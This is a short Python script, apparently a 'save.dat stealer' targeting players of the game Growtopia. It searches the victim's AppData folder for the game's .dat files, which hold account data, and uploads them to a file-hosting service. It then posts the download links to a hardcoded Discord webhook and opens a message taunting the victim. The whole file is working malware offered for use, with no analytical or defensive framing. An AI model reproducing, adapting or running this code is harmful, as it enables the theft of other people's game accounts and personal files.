# Coded By NumeX
# Credit : https://github.com/znqi/savedatstealer (Idea)

import os
from pathlib import Path
import requests
import json
import glob

webhook = "https://discord.com/api/webhooks/1050657049538744321/YDnZ63laWePk6sH03w2d4d-v6bXh1L_mEWmrJD3gk3qld8bRetwitftF6x-OHGhXFZWO"

home = Path.home()
path = str(home)

ff = open('msg.txt', 'w')
ff.write('Your save.dat got hacked by Me. Please be safe next time') # > you can edit whatever you want but iam not responsibled
ff.close()

# Test : '\Desktop\host.txt'
# Save.dat Path : '\AppData\Local\Growtopia\save.dat'

def steal():
	for i in glob.glob(f'{path}\AppData\Local\Growtopia\*.dat'):
		if '.' in i:
			data = {'file': (open(i, "rb"))}
			r = requests.post('https://api.anonfile.com/upload', files=data)
			resp = json.loads(r.text)
		else:
			pass

		if resp['status']:
			urllong = resp['data']['file']['url']['full']
			urlshort = resp['data']['file']['url']['short']
			payload = {'content': f"**Save.dat Stealer By NumeX**\n**URL Long** : `{urllong}`\n**URL Short** : `{urlshort}`"}
			requests.post(webhook, json=payload)
		else:
			message = resp['error']['message']
			errtype = resp['error']['type']
			print(f'[ERROR] {message}\n{errtype}')

if __name__ == "__main__":
	steal()
	os.system('start msg.txt')
